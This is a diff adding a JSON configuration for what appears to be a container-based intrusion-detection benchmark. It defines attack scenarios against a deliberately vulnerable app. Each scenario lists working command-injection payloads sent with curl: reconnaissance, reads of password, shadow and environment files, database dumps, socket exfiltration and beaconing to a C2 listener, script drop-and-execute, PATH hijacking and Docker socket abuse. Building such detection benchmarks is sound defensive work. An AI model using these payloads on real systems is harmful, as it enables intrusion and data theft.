@@ -1,0 +1,260 @@
+{
+  "scenario_set": "formal_v3",
+  "window_seconds": 30,
+  "time_bin_seconds": 2,
+  "mixed_stage_defaults": {
+    "warmup_seconds": 60,
+    "cooldown_seconds": 60
+  },
+  "split_semantics": {
+    "attack_dev": "Use only for pipeline debugging and qualitative case studies. Do not use for GMAE training, benign calibration, or threshold selection.",
+    "attack_holdout": "Use only for final attack benchmark reporting after threshold selection is frozen."
+  },
+  "container_roles": {
+    "target_containers": [
+      {"role": "target", "service": "vuln-app", "container_name": "drsec-target"},
+      {"role": "target_dsock", "service": "vuln-app-dsock", "container_name": "drsec-target-dsock"}
+    ],
+    "supporting_containers": [
+      {"role": "c2", "service": "c2-listener", "container_name": "drsec-c2"}
+    ],
+    "driver_container": {
+      "role": "attacker",
+      "image": "curlimages/curl:8.6.0",
+      "container_name_pattern": "drsec-bench-{scenario_id}-r{repeat_id}-{driver_role}"
+    }
+  },
+  "trace_scope": {
+    "scope_expression": ["container", "comm!=tracee"],
+    "target_roles": ["target", "target_dsock"],
+    "supporting_roles": ["c2"],
+    "driver_roles": ["attacker"]
+  },
+  "scenarios": [
+    {
+      "id": "recon_probe",
+      "family_id": "recon_probe",
+      "benchmark_split": "attack_dev",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "Process, environment, filesystem, and app-configuration reconnaissance through command injection.",
+      "command_variants": [
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;id;uname -a;pwd;ls -la /app;find /app -maxdepth 2 -type f | sort | head -n 25\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;ps aux;env | sort | head -n 25;cat /etc/os-release;ls -la /tmp\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;whoami;hostname;cat /proc/self/status;ls -la /proc/1;stat /app/app.py\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "recon_fs_app", "command_template_id": "recon_probe.fs_app_listing", "parameters": {"focus": "app_files", "max_depth": 2, "head_lines": 25}},
+        {"variant_id": "recon_proc_env", "command_template_id": "recon_probe.proc_env_listing", "parameters": {"focus": "process_env", "env_head_lines": 25}},
+        {"variant_id": "recon_proc_status", "command_template_id": "recon_probe.proc_status_probe", "parameters": {"focus": "proc_status", "proc_path": "/proc/1"}}
+      ]
+    },
+    {
+      "id": "secret_read",
+      "family_id": "secret_read",
+      "benchmark_split": "attack_dev",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "Sensitive local file and runtime secret reads.",
+      "command_variants": [
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;cat /etc/passwd;cat /etc/shadow 2>/dev/null || true;cat /etc/hostname\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;tr '\\\\0' '\\\\n' < /proc/self/environ | sort | head -n 40;ls -la /app/data\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;for f in /etc/passwd /etc/group /app/app.py; do echo FILE:$f; head -n 20 $f; done\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "secret_system_files", "command_template_id": "secret_read.system_files", "parameters": {"files": ["/etc/passwd", "/etc/shadow", "/etc/hostname"]}},
+        {"variant_id": "secret_environ_appdata", "command_template_id": "secret_read.environ_appdata", "parameters": {"files": ["/proc/self/environ", "/app/data"], "head_lines": 40}},
+        {"variant_id": "secret_mixed_head", "command_template_id": "secret_read.mixed_head", "parameters": {"files": ["/etc/passwd", "/etc/group", "/app/app.py"], "head_lines": 20}}
+      ]
+    },
+    {
+      "id": "db_dump_local",
+      "family_id": "db_dump_local",
+      "benchmark_split": "attack_dev",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "Direct local SQLite database reads and structured dumps.",
+      "command_variants": [
+        "curl -s -H 'Content-Type: application/json' -d '{\"customer\":\"seed\",\"item\":\"sku-001\",\"quantity\":1}' 'http://vuln-app:5000/api/order' >/dev/null; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import json,sqlite3; c=sqlite3.connect('/app/data/app.db'); print(json.dumps({'users':c.execute('select username,role from users order by username').fetchall(),'orders':c.execute('select customer,item,quantity from orders order by id desc limit 8').fetchall()}, default=list))\\\"\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import sqlite3; c=sqlite3.connect('/app/data/app.db'); [print(r) for r in c.execute('select event,created_at from audit_logs order by id desc limit 12')]\\\"\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import json,sqlite3; c=sqlite3.connect('/app/data/app.db'); print(json.dumps({'sessions':c.execute('select username,created_at,expires_at from sessions order by created_at desc limit 5').fetchall()}, default=list))\\\"\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "db_dump_users_orders", "command_template_id": "db_dump_local.users_orders_query", "parameters": {"tables": ["users", "orders"], "orders_limit": 8, "seed_order": true}},
+        {"variant_id": "db_dump_audit", "command_template_id": "db_dump_local.audit_query", "parameters": {"tables": ["audit_logs"], "audit_limit": 12}},
+        {"variant_id": "db_dump_sessions", "command_template_id": "db_dump_local.sessions_query", "parameters": {"tables": ["sessions"], "sessions_limit": 5}}
+      ]
+    },
+    {
+      "id": "db_exfil_c2",
+      "family_id": "db_exfil_c2",
+      "benchmark_split": "attack_dev",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target", "c2"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "SQLite content exfiltration to the sidecar C2 service.",
+      "command_variants": [
+        "curl -s -H 'Content-Type: application/json' -d '{\"customer\":\"seed\",\"item\":\"sku-002\",\"quantity\":2}' 'http://vuln-app:5000/api/order' >/dev/null; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import json,sqlite3,socket; c=sqlite3.connect('/app/data/app.db'); rows=c.execute('select customer,item,quantity from orders order by id desc limit 8').fetchall(); p=json.dumps({'orders':rows}, default=list).encode(); s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(p); s.close()\\\"\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import json,sqlite3,socket; c=sqlite3.connect('/app/data/app.db'); rows=c.execute('select username,role,created_at from users').fetchall(); s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(json.dumps({'users':rows}, default=list).encode()); s.close()\\\"\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import json,sqlite3,socket; c=sqlite3.connect('/app/data/app.db'); rows=c.execute('select event,meta_json from audit_logs order by id desc limit 10').fetchall(); s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(json.dumps({'audit':rows}, default=list).encode()); s.close()\\\"\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "exfil_orders_socket", "command_template_id": "db_exfil_c2.orders_socket", "parameters": {"tables": ["orders"], "limit": 8, "seed_order": true, "c2_host": "c2-listener", "c2_port": 4444}},
+        {"variant_id": "exfil_users_socket", "command_template_id": "db_exfil_c2.users_socket", "parameters": {"tables": ["users"], "c2_host": "c2-listener", "c2_port": 4444}},
+        {"variant_id": "exfil_audit_socket", "command_template_id": "db_exfil_c2.audit_socket", "parameters": {"tables": ["audit_logs"], "limit": 10, "c2_host": "c2-listener", "c2_port": 4444}}
+      ]
+    },
+    {
+      "id": "drop_and_exec",
+      "family_id": "drop_and_exec",
+      "benchmark_split": "attack_dev",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "Drop a script to writable storage and execute it.",
+      "command_variants": [
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;printf '#!/bin/sh\\nid > /tmp/agent.out\\nuname -a >> /tmp/agent.out\\n' > /tmp/agent.sh; chmod +x /tmp/agent.sh; /tmp/agent.sh\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;printf '#!/bin/sh\\ncat /etc/hostname > /tmp/.cache-update\\nls -la /app >> /tmp/.cache-update\\n' > /tmp/cache_update.sh; chmod 755 /tmp/cache_update.sh; sh /tmp/cache_update.sh\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;printf 'import os,platform\\nopen(\\\"/tmp/task.out\\\",\\\"w\\\").write(os.popen(\\\"id\\\").read()+platform.platform())\\n' > /tmp/task.py; python /tmp/task.py\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "drop_shell_agent", "command_template_id": "drop_and_exec.shell_agent", "parameters": {"path": "/tmp/agent.sh", "interpreter": "sh", "mode": "+x"}},
+        {"variant_id": "drop_cache_update", "command_template_id": "drop_and_exec.cache_update", "parameters": {"path": "/tmp/cache_update.sh", "interpreter": "sh", "mode": "755"}},
+        {"variant_id": "drop_python_task", "command_template_id": "drop_and_exec.python_task", "parameters": {"path": "/tmp/task.py", "interpreter": "python"}}
+      ]
+    },
+    {
+      "id": "path_hijack_exec",
+      "family_id": "path_hijack_exec",
+      "benchmark_split": "attack_dev",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "PATH hijack or command replacement followed by execution.",
+      "command_variants": [
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;printf '#!/bin/sh\\necho hijacked > /tmp/hijack.txt\\necho PWNED\\n' > /tmp/ping; chmod +x /tmp/ping; PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ping -c 1 127.0.0.1\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;mkdir -p /tmp/bin; printf '#!/bin/sh\\nid > /tmp/id_hijack.out\\n' > /tmp/bin/id; chmod +x /tmp/bin/id; PATH=/tmp/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin id\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;mkdir -p /tmp/bin; printf '#!/bin/sh\\necho fake-uname > /tmp/uname_hijack.out\\n/bin/uname \\\"$@\\\"\\n' > /tmp/bin/uname; chmod +x /tmp/bin/uname; PATH=/tmp/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin uname -a\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "hijack_ping_tmp", "command_template_id": "path_hijack_exec.ping_tmp", "parameters": {"binary": "ping", "drop_dir": "/tmp"}},
+        {"variant_id": "hijack_id_tmpbin", "command_template_id": "path_hijack_exec.id_tmpbin", "parameters": {"binary": "id", "drop_dir": "/tmp/bin"}},
+        {"variant_id": "hijack_uname_tmpbin", "command_template_id": "path_hijack_exec.uname_tmpbin", "parameters": {"binary": "uname", "drop_dir": "/tmp/bin"}}
+      ]
+    },
+    {
+      "id": "docker_sock_abuse",
+      "family_id": "docker_sock_abuse",
+      "benchmark_split": "attack_holdout",
+      "kind": "attack",
+      "target_service": "vuln-app-dsock",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target_dsock"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "Docker socket probing and container enumeration through the socket-mounted target.",
+      "command_variants": [
+        "curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /version HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); print(s.recv(4096).decode('utf-8','ignore'))\\\"\" >/dev/null",
+        "curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /containers/json HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); print(s.recv(8192).decode('utf-8','ignore'))\\\"\" >/dev/null",
+        "curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /info HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); print(s.recv(8192).decode('utf-8','ignore'))\\\"\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "docker_sock_version", "command_template_id": "docker_sock_abuse.version_http", "parameters": {"socket": "/var/run/docker.sock", "path": "/version", "recv_bytes": 4096}},
+        {"variant_id": "docker_sock_containers", "command_template_id": "docker_sock_abuse.containers_http", "parameters": {"socket": "/var/run/docker.sock", "path": "/containers/json", "recv_bytes": 8192}},
+        {"variant_id": "docker_sock_info", "command_template_id": "docker_sock_abuse.info_http", "parameters": {"socket": "/var/run/docker.sock", "path": "/info", "recv_bytes": 8192}}
+      ]
+    },
+    {
+      "id": "long_lived_beacon",
+      "family_id": "long_lived_beacon",
+      "benchmark_split": "attack_holdout",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target", "c2"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "Low-frequency periodic outbound beacon with lightweight exfiltration attempts.",
+      "command_variants": [
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;for i in $(seq 1 6); do python -c \\\"import socket; s=socket.create_connection(('c2-listener',4444),2); s.sendall(('beacon:%s' % '$i').encode()); s.close()\\\" 2>/dev/null || true; sleep 10; done\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;for i in $(seq 1 5); do python -c \\\"import os,socket; s=socket.create_connection(('c2-listener',4444),2); s.sendall(('host='+os.uname().nodename).encode()); s.close()\\\" 2>/dev/null || true; sleep 12; done\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;for i in $(seq 1 4); do python -c \\\"import socket; s=socket.create_connection(('c2-listener',4444),2); s.sendall(open('/etc/hostname','rb').read()); s.close()\\\" 2>/dev/null || true; sleep 15; done\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "beacon_counter_10s", "command_template_id": "long_lived_beacon.counter_socket_10s", "parameters": {"iterations": 6, "sleep_seconds": 10, "payload": "counter", "c2_port": 4444}},
+        {"variant_id": "beacon_hostname_12s", "command_template_id": "long_lived_beacon.hostname_socket_12s", "parameters": {"iterations": 5, "sleep_seconds": 12, "payload": "hostname", "c2_port": 4444}},
+        {"variant_id": "beacon_file_15s", "command_template_id": "long_lived_beacon.file_socket_15s", "parameters": {"iterations": 4, "sleep_seconds": 15, "payload": "/etc/hostname", "c2_port": 4444}}
+      ]
+    },
+    {
+      "id": "resource_abuse",
+      "family_id": "resource_abuse",
+      "benchmark_split": "attack_holdout",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 210,
+      "warmup_seconds": 60,
+      "attack_seconds": 90,
+      "cooldown_seconds": 60,
+      "description": "CPU-intensive loop or mmap/probe behavior standing in for resource abuse.",
+      "command_variants": [
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"exec('import time\\\\nt=time.time()+30\\\\nx=0\\\\nwhile time.time()<t:\\\\n x=(x*1664525+1013904223) & 0xFFFFFFFF\\\\nprint(\\\\\\\"miner_done\\\\\\\")')\\\"\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"exec('import mmap,time\\\\nf=open(\\\\\\\"/etc/ld.so.cache\\\\\\\",\\\\\\\"rb\\\\\\\")\\\\nm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)\\\\nt=time.time()+20\\\\nwhile time.time()<t:\\\\n _=m[:64]\\\\nm.close(); f.close(); print(\\\\\\\"mmap_probe_done\\\\\\\")')\\\"\" >/dev/null",
+        "curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"exec('import hashlib,time\\\\nt=time.time()+25\\\\nx=b\\\\\\\"seed\\\\\\\"\\\\nwhile time.time()<t:\\\\n x=hashlib.sha256(x).digest()\\\\nprint(x.hex()[:16])')\\\"\" >/dev/null"
+      ],
+      "variant_metadata": [
+        {"variant_id": "cpu_lcg_30s", "command_template_id": "resource_abuse.lcg_loop_30s", "parameters": {"duration_seconds": 30, "workload": "lcg"}},
+        {"variant_id": "mmap_probe_20s", "command_template_id": "resource_abuse.mmap_probe_20s", "parameters": {"duration_seconds": 20, "file": "/etc/ld.so.cache", "read_bytes": 64}},
+        {"variant_id": "cpu_hash_25s", "command_template_id": "resource_abuse.hash_loop_25s", "parameters": {"duration_seconds": 25, "workload": "sha256"}}
+      ]
+    }
+  ]
+}
